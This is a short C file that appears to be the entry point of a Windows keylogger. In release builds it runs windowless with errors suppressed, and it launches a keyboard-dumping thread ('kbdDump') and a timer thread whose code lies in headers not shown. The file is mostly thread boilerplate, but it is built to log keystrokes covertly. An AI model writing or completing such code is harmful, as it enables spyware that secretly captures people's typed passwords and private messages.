#include <windows.h>

#include "shared.h"
#include "kbdHandler.h"
#include "timer.h"

#ifndef DEBUG
int WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine,
    int       nShowCmd
)
#else
int main()
#endif
{
    Mutex = CreateMutex(NULL, FALSE, NULL);
    if (Mutex == NULL)
    {
#ifdef DEBUG
        handleError("CreateMutex");
#endif
        return -1;
    }

    DWORD inputHandlerTID;
    HANDLE inputHandlerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)kbdDump, 0, 0, &inputHandlerTID);
    if (inputHandlerT == NULL)
    {
#ifdef DEBUG
        handleError("CreateThread");
#endif
        return -1;
    }

    DWORD timerHandlerTID;
    HANDLE timerHandlerT = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handleTimer, 0, 0, &timerHandlerTID);
    if (timerHandlerT == NULL)
    {
#ifdef DEBUG
        handleError("CreateThread");
#endif
        return -1;
    }

    HANDLE handles[] = { timerHandlerT, inputHandlerT };

    WaitForMultipleObjects(2, handles, TRUE, INFINITE);

    CloseHandle(timerHandlerT);
    CloseHandle(inputHandlerT);
    CloseHandle(Mutex);

    return 0;
}
